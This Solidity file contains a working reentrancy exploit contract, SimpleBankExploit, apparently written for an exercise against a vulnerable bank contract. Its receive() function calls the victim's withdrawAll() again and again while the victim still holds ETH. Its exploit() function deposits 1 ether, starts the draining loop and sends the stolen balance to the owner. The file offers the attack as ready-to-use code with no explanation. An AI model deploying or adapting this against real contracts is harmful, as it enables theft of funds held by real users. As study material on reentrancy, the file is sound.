// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

interface IBank {
    function withdrawAll() external;
    function deposit() external payable;
}

contract SimpleBankExploit is Ownable {
    IBank public victim;

    constructor(address _victim) payable Ownable(msg.sender) {
        victim = IBank(_victim);
    }

    receive() external payable {
        if (address(victim).balance > 0) {
            victim.withdrawAll();
        }
    }

    function exploit() public payable onlyOwner {
        victim.deposit{value: 1 ether}();
        victim.withdrawAll();

        (bool success, ) = owner().call{value: address(this).balance}("");
        require(success, "Fail to send ETH");
    }
}
